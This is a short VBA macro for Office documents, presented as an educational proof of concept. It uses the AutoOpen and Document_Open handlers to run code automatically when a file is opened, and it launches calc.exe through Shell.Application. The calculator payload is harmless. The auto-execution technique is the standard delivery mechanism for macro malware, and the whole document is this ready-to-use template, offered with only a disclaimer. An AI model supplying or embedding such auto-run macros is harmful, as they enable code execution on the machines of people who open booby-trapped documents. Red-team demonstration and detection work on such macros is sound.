' ===============================================
' Author: Maerih
' Disclaimer: This code is for educational purposes only
' Use only in authorized testing environments
' ===============================================

Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
Sub MyMacro()
    ' Method 1: Using InvokeVerbEx with Shell Application
    Dim shell As Object
    Set shell = CreateObject("Shell.Application")
    shell.ShellExecute "calc.exe", "", "", "open", 1
End Sub
